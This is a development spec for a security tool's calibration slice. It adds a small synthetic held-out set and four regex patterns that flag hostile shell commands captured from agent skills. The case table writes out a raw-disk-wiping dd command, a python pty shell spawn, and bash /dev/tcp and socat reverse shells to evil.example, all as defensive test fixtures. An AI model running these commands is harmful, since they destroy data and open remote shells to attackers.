# Spec — `a5-calibration` / `core` (A5 held-out shell calibration)

## Problem slice & user outcome

A held-out shell set measures the current A5 list, then four high-confidence `HIGH` patterns are
added and the set is re-measured. The main 20-case benchmark does not move, and the verdict contract
is untouched. A reviewer sees a before/after with denominators and clean guards.

## In scope

- `corpus/heldout/cases/<id>/` (8 synthetic cases: 4 malicious, 4 clean) and its README.
- Baseline and after reports via `assay corpus corpus/heldout/`.
- Four `SHELL_PATTERNS` additions in `src/assay/verdict/assess.py`.
- Pattern table tests and a held-out corpus test; a main-corpus metric pin.
- Docs: corpus README split, README verdict, CAPABILITY_ROADMAP A5, ROADMAP, CLAUDE.md.
- No new dependency; no contract/trace/bundle/schema change.

## Out of scope

Instruction/network severity changes; tuning the 20-case development corpus; real-world samples;
MCP; new formats; a split flag; confidence intervals; changing the floor or verdict contract.

## Held-out cases

`corpus/heldout/cases/<id>/{case.json,SKILL.md,<hash>.json}`, schema 2, `labeler: aliz`,
`labeled_at: 2026-11-05`, `strictness: standard`, `source: synthetic`.

| id | label | tools | shell command | expected after |
|---|---|---|---|---|
| `heldout-dd-disk` | malicious | `Read` | `dd if=/dev/zero of=/dev/disk0 bs=1m` | MALICIOUS |
| `heldout-python-pty` | malicious | `Read` | `python3 -c 'import pty; pty.spawn("/bin/sh")'` | MALICIOUS |
| `heldout-dev-tcp` | malicious | `Read` | `bash -i >& /dev/tcp/evil.example/4444 0>&1` | MALICIOUS |
| `heldout-socat-shell` | malicious | `Read` | `socat TCP:evil.example:4444 EXEC:/bin/sh` | MALICIOUS |
| `heldout-dd-null` | clean | `Bash` | `dd if=backup.img of=/dev/null bs=1m` | CLEAN |
| `heldout-socat-server` | clean | `Bash` | `socat TCP-LISTEN:8080,fork EXEC:./server` | CLEAN |
| `heldout-python-print` | clean | `Bash` | `python3 -c "print('ok')"` | CLEAN |
| `heldout-chmod-local` | clean | `Bash` | `chmod +x scripts/build.sh && ./scripts/build.sh` | CLEAN |

- Malicious: files `[]`, network `[]`, one `SHELL/OK` event; expected_classes `["shell"]`.
- Clean: files `[]`, network `[]`, one `SHELL/OK` event; expected_classes `[]`.
- The trace `skill_content_hash` matches the `SKILL.md`; the file is named after its hash.

## Patterns

Add to `SHELL_PATTERNS` (order after the existing entries; labels readable):

```python
("dd to a device", re.compile(r"\bdd\b[^;&|]*\bof=/dev/(?!null\b|zero\b)")),
("pty spawn", re.compile(r"\bpty\.spawn\s*\(")),
("dev tcp", re.compile(r"/dev/tcp/")),
("socat shell", re.compile(r"\bsocat\b[^;&|]*\bexec:/bin/(?:ba)?sh\b", re.IGNORECASE)),
```

- `dd` to `/dev/null`/`/dev/zero` is not HIGH; `of=/dev/disk0` is.
- `socat ... EXEC:/bin/sh` is HIGH; `EXEC:./server` is not.
- The patterns apply only to captured shell commands; no skill-text scan.

## Acceptance criteria

1. Baseline (before the pattern change) on `corpus/heldout/`: 4 malicious `FLAGGED`, 4 clean `CLEAN`,
   precision `null` (0/0), recall 0.00 (0/4), detection 1.00 (4/4), clean false-MALICIOUS 0/4,
   coverage 1.00 (8/8). Record the exact human/JSON report.
2. After the change: 4 malicious `MALICIOUS`, 4 clean `CLEAN`, precision 1.00 (4/4), recall 1.00
   (4/4), detection 1.00 (4/4), clean false-MALICIOUS 0/4, coverage 1.00 (8/8). Record it.
3. The main 20-case corpus report is unchanged: precision 1.00 (5/5), recall 0.71 (5/7), detection
   1.00 (7/7), clean false-MALICIOUS 0.00 (0/6), clean review 0.33 (2/6), coverage 0.65 (13/20).
4. Pattern table: each malicious command yields a `SHELL/HIGH` finding with `review_required` and a
   `MALICIOUS` assessment on its trace; each clean command yields no `HIGH` finding and a `CLEAN`
   assessment on its trace.
5. `corpus/README.md` documents the development/held-out split, the before/after, and that the
   held-out set is a calibration control; the main report is unchanged.
6. README verdict section names the four patterns and keeps the "deliberately narrow" limit;
   CAPABILITY_ROADMAP A5 says calibrated on a held-out set; ROADMAP has a dated progress block;
   CLAUDE.md status is accurate.
7. `uv run pytest` green and offline; no new dependency; no A5 contract/floor/severity change; no
   trace/bundle/corpus schema change.

## Dependencies & sequencing

A5 (`SHELL_PATTERNS`), A7 (corpus loader/report), A6 (bundle replay unaffected). Order: create
held-out cases → baseline → patterns/tests → after → main-corpus pin → docs.

## Risks

- A false HIGH on a clean guard is the failure mode; the four clean cases are tests.
- `dd`/`socat` regex breadth; the lookahead/specific `EXEC:/bin/sh` are deliberate.
- The held-out set is small and synthetic; it is a calibration smoke test, not a benchmark.
- The set is no longer unseen after merge; a future calibration needs a new held-out set.
- The 0.71 strict recall is partly by design (instruction/network caps); this slice does not change
  it.
